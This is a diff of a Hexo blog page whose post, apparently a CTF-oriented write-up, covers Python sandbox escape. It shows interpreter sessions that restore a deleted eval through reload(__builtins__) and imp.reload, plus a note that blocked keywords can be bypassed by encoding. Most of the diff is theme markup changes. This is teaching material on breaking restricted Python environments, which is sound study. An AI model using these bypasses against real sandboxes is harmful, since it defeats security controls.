-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'eval'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;eval&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>python3.x引入reload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>imp.reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>imp.reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
+
 
 <p>小结：大多数的关键词都是可以通过编码 反转这些绕过的</p>
 <p>参考链接</p>
-<p><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>
-<p><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a></p>
-
-            
-
+<p><a class="link" target="_blank" rel="noopener" href="http://yulige.top/?p=502">http://yulige.top/?p=502<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/203208.html">https://www.freebuf.com/articles/system/203208.html<i class="fas fa-external-link-alt"></i></a></p>
 
         </div>
-    </div>
-    <div id="post-footer" class="post-footer main-content-wrap">
+
         
-        
-            <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/12/Nosql注入/"
-                    data-tooltip="Nosql注入"
-                    aria-label="上一篇: Nosql注入"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/11/ctf中的mysql注入总结/"
-                    data-tooltip="ctf中的mysql注入总结"
-                    aria-label="下一篇: ctf中的mysql注入总结"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：python沙盒逃逸one</li>
+        <li>Post author：p1k</li>
+        <li>Create time：2019-09-11 21:36:13</li>
+        <li>
+            Post link：http://p1keman.github.io/2019/09/11/python沙盒逃逸one/
         </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
         </li>
     </ul>
 </div>
 
+            </div>
+        
 
         
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/09/12/Nosql%E6%B3%A8%E5%85%A5/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Nosql注入</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/09/11/ctf%E4%B8%AD%E7%9A%84mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ctf中的mysql注入总结</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
         
-            
+
         
     </div>
-</article>
+</div>
 
 
+                
+            </div>
 
-                <footer id="footer" class="main-content-wrap">
-    <span class="copyrights">
-        Copyrights &copy; 2020 John Doe. All Rights Reserved.
-    </span>
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
+        </div>
+    </div>
 </footer>
 
-            </div>
-            
-                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
-                    <div class="post-actions-wrap">
-    <nav>
-        <ul class="post-actions post-action-nav">
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/12/Nosql注入/"
-                    data-tooltip="Nosql注入"
-                    aria-label="上一篇: Nosql注入"
-                >
-                    
-                        <i class="fa fa-angle-left" aria-hidden="true"></i>
-                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
-                    </a>
-            </li>
-            <li class="post-action">
-                
-                    
-                <a
-                    class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/09/11/ctf中的mysql注入总结/"
-                    data-tooltip="ctf中的mysql注入总结"
-                    aria-label="下一篇: ctf中的mysql注入总结"
-                >
-                    
-                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
-                        <i class="fa fa-angle-right" aria-hidden="true"></i>
-                    </a>
-            </li>
-        </ul>
-    </nav>
-    <ul class="post-actions post-action-share">
-        <li class="post-action hide-lg hide-md hide-sm">
-            <a
-                class="post-action-btn btn btn--default btn-open-shareoptions"
-                href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
-            >
-                <i class="fa fa-share-alt" aria-hidden="true"></i>
-            </a>
-        </li>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
             </li>
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
+
+        <!-- go comment -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
     </ul>
 </div>
 
-
-                </div>
-                
-    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
-        <i id="btn-close-shareoptions" class="fa fa-times"></i>
-        <ul class="share-options">
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                        aria-label="分享到 Facebook"
-                    >
-                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                        aria-label="分享到 Twitter"
-                    >
-                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/11/python沙盒逃逸one/"
-                        aria-label="分享到 Google+"
-                    >
-                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
-                    </a>
-                </li>
-            
-        </ul>
-    </div>
-
-
-            
         </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
         
 
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
 
-<div id="about">
-    <div id="about-card">
-        <div id="about-btn-close">
-            <i class="fa fa-times"></i>
-        </div>
-        
-            <h4 id="about-card-name">John Doe</h4>
-        
-            <div id="about-card-bio"><p>author.bio</p>
-</div>
-        
-        
-            <div id="about-card-job">
-                <i class="fa fa-briefcase"></i>
-                <br/>
-                <p>author.job</p>
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
 
-            </div>
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
         
-        
-    </div>
+    </ul>
 </div>
 
-        
-        
-<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
-        <!--SCRIPTS-->
-<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
-<!--SCRIPTS END-->
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8C%E4%B9%89%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="nav-text">同义词绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#import"><span class="nav-text">_import_</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#importlib"><span class="nav-text">_importlib_</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#execfile"><span class="nav-text">execfile</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E6%A8%A1%E5%9D%97"><span class="nav-text">内建模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E8%A2%AB%E5%88%A0%E9%99%A4"><span class="nav-text">模块被删除</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E5%AF%BC%E5%85%A5"><span class="nav-text">路径导入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reload%E9%87%8D%E8%BD%BD"><span class="nav-text">reload重载</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
 
+</main>
 
 
 
-    </body>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
 </html>
